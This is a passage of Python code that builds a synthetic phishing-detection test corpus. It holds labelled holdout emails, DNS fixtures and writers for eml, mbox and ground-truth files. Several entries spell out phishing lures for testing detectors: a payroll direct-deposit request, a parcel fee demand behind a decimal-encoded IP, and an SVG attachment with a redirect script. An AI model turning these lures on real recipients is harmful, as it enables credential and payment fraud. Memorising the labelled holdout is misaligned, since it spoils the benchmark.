@entry("H03-internal-maintenance-notice", "benign", "internal", "IT Help Desk (real domain) announcing maintenance with a sign-in reminder; protected display name on the real domain.", forbid=("display_name_exec_spoof", "sender_domain_lookalike"), set_="holdout")
def _h03():
    h = hdr('"IT Help Desk" <helpdesk@' + ORG_DOMAIN + '>', "Scheduled maintenance Saturday 22:00-23:00", 29, 15, 5, "<hd.20260329@" + ORG_DOMAIN + ">", rp="helpdesk@" + ORG_DOMAIN,
            recv=deliver("mail-it." + ORG_DOMAIN, "mail-it." + ORG_DOMAIN, "10.20.3.3", 29, 15, 5), auth=ar(("pass", ORG_DOMAIN), (("pass", ORG_DOMAIN, "sel1"),), ("pass", ORG_DOMAIN)))
    return build_eml(h, "VPN and email will be offline Saturday 22:00-23:00. You will be asked to sign in again afterwards. Status: https://status." + ORG_DOMAIN + "\n\nIT Help Desk\n")


@entry("H04-payroll-direct-deposit-change", "phishing", "BEC", "'Payroll' display name from a free-mail account asking to update direct deposit details via a shortened link.",
       expect=("display_name_exec_spoof", "freemail_display_spoof", "payment_lure", "url_shortener"), set_="holdout")
def _h04():
    h = hdr('"Payroll" <payroll.dept2026@freemail.example>', "Update your direct deposit before Friday payroll", 30, 12, 44, "<pr.31@freemail.example>", rp="payroll.dept2026@freemail.example",
            rt="payroll.updates@mail-desk.test", recv=deliver("mail-oa2.freemail.example", "mail-oa2.freemail.example", "198.51.100.15", 30, 12, 44),
            auth=ar(("pass", "freemail.example"), (("pass", "freemail.example", "f1"),), ("pass", "freemail.example")))
    return build_eml(h, "To receive your next pay on time, update your direct deposit details by Friday: https://short.test/Pr0ll\n")


@entry("H05-voicemail-svg-script", "phishing", "malicious attachment", "'Voice message' lure with an SVG attachment containing script, sender authentication failing.",
       expect=("svg_script",), set_="holdout")
def _h05():
    h = hdr('"Voice Service" <vm@voice-notify.test>', "New voice message (0:42)", 31, 9, 9, "<vm.9@voice-notify.test>", rp="vm@voice-notify.test",
            recv=deliver("voice-notify.test", "voice-notify.test", "203.0.113.160", 31, 9, 9), auth=ar(("fail", "voice-notify.test"), (), ("fail", "voice-notify.test")))
    svg = b'<svg xmlns="http://www.w3.org/2000/svg" width="120" height="40"><script>window.location="https://voice-notify.test/play?u=alex";</script><text x="5" y="25">Play</text></svg>'
    return build_eml(h, "You have a new voice message. Open the attachment to play it.\n", None, [Att("voicemail-0042.svg", svg, "image/svg+xml")])


@entry("H06-parcel-fee-decimal-ip", "phishing", "URL trick", "Postal-service fee lure with a decimal-encoded IP host and a brand display name from an unrelated domain.",
       expect=("url_ip_host", "url_obfuscated", "display_name_brand_spoof"), set_="holdout")
def _h06():
    import ipaddress
    dec = int(ipaddress.ip_address("203.0.113.77"))
    h = hdr('"Canada Post" <delivery@parcel-notice.test>', "Parcel on hold: pay customs fee", 31, 21, 30, "<cp.3@parcel-notice.test>", rp="delivery@parcel-notice.test",
            recv=deliver("parcel-notice.test", "parcel-notice.test", "198.51.100.61", 31, 21, 30), auth=ar(("softfail", "parcel-notice.test"), (), ("fail", "parcel-notice.test")))
    return build_eml(h, f"Your parcel is on hold. Pay the customs fee within 48 hours: http://{dec}/pay\n")


@entry("H07-unauth-rar-password", "suspicious", "borderline", "Unauthenticated mail with a RAR archive and the password in the body. RAR contents are not inspected, so only the weak signals are available.",
       expect=("archive_password_hint",), set_="holdout")
def _h07():
    h = hdr('"Records Office" <records@archive-send.example>', "Requested records", 31, 23, 50, "<rec.5@archive-send.example>", rp="records@archive-send.example",
            recv=deliver("mail.archive-send.example", "mail.archive-send.example", "192.0.2.180", 31, 23, 50))
    rar = b"Rar!\x1a\x07\x00" + b"SYNTHETIC INERT RAR STUB - NOT AN ARCHIVE" + b"\x00" * 16
    return build_eml(h, "Records attached. The password is: records2026\n", None, [Att("records.rar", rar, "application/x-rar-compressed")])


@entry("H08-aws-billing-brand-on-real-domain", "benign", "legit brand", "Brand name in the display name on the brand's real (sub)domain, authenticated: must not be called a brand spoof.", forbid=("display_name_brand_spoof", "sender_domain_lookalike", "url_brand_in_subdomain"), set_="holdout")
def _h08():
    h = hdr('"Amazon Web Services" <no-reply-aws@aws.amazon.com>', "Your AWS invoice is available", 31, 5, 15, "<aws.0031@email.amazon.com>", rp="0031@bounces.aws.amazon.com",
            recv=deliver("a8-12.smtp-out.amazon.com", "a8-12.smtp-out.amazon.com", "192.0.2.77", 31, 5, 15),
            auth=ar(("pass", "0031@bounces.aws.amazon.com"), (("pass", "amazon.com", "aws1"),), ("pass", "aws.amazon.com")))
    return build_eml(h, "Your invoice is available: https://console.aws.amazon.com/billing/home\n")


# ================================================================================================ output
DNS_FIXTURES = {
    "_note": "SYNTHETIC DNS records for the offline SPF evaluator. No real lookups are ever made.",
    "domains": {
        "vendor-pay.example": {"TXT": ["v=spf1 ip4:203.0.113.0/24 -all"]},
        "northwind-analytlcs.example": {"TXT": ["v=spf1 ip4:203.0.113.0/24 -all"]},
        "northwind-analytics.example": {"TXT": ["v=spf1 ip4:10.20.0.0/16 mx -all"], "MX": ["mx1.northwind-analytics.example"]},
        "mx1.northwind-analytics.example": {"A": ["10.20.0.5"]},
    },
}


def build_corpus(sets: Optional[Tuple[str, ...]] = None) -> List[dict]:
    out = []
    for e in ENTRIES:
        if sets is None or e["set"] in sets:
            out.append({k: v for k, v in e.items() if k != "build"} | {"bytes": e["build"]()})
    return out


def ground_truth(entries: List[dict]) -> dict:
    return {"synthetic": True, "notice": NOTICE, "corpus_version": CORPUS_VERSION, "labels": ["benign", "suspicious", "phishing"],
            "messages": [{k: e[k] for k in ("file", "id", "label", "category", "set", "description", "expect", "forbid")} for e in entries]}


def write_corpus(outdir: str) -> dict:
    """Write samples/*.eml, corpus.mbox, dns_fixtures.json, ground_truth.json and README_SYNTHETIC.txt. Returns ground truth."""
    os.makedirs(os.path.join(outdir, "eml"), exist_ok=True)
    entries = build_corpus()
    mbox_parts = []
    for e in entries:
        with open(os.path.join(outdir, "eml", e["file"]), "wb") as fh:
            fh.write(e["bytes"])
        body = e["bytes"].replace(b"\r\n", b"\n").decode("ascii")
        body = "\n".join((">" + l if l.startswith("From ") else l) for l in body.split("\n"))
        mbox_parts.append(f"From synthetic@example.invalid Mon Mar  2 00:00:00 2026\n{body}\n")
    with open(os.path.join(outdir, "corpus.mbox"), "w", encoding="ascii", newline="\n") as fh:
        fh.write("".join(mbox_parts))
    gt = ground_truth(entries)
    with open(os.path.join(outdir, "ground_truth.json"), "w", encoding="utf-8") as fh:
        json.dump(gt, fh, indent=2, ensure_ascii=False)
        fh.write("\n")
    with open(os.path.join(outdir, "dns_fixtures.json"), "w", encoding="utf-8") as fh:
        json.dump(DNS_FIXTURES, fh, indent=2)
        fh.write("\n")
    with open(os.path.join(outdir, "README_SYNTHETIC.txt"), "w", encoding="utf-8") as fh:
        fh.write(NOTICE + "\n\nRegenerate with: python -m phishanalyzer generate\n")
    return gt
